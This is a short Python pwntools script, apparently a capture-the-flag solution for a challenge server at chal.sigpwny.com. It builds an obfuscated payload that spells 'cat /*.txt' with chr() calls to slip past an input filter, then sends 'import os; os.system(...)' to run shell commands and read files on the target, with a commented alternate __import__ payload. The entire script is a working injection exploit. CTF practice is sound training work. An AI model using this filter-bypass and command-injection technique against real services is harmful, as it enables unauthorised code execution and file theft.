from pwn import *

conn = remote('chal.sigpwny.com', 5013)

conn.recvline()

# [ord(c) for c in "__import__('os').system(\"cat /*.txt\")"])


cat = "".join('chr({})+'.format(ord(c)) for c in "cat /*.txt")
cat = cat[:-1]

exploit = "import os; os.system(" + cat + ")"


conn.sendline(exploit.encode())
conn.interactive()
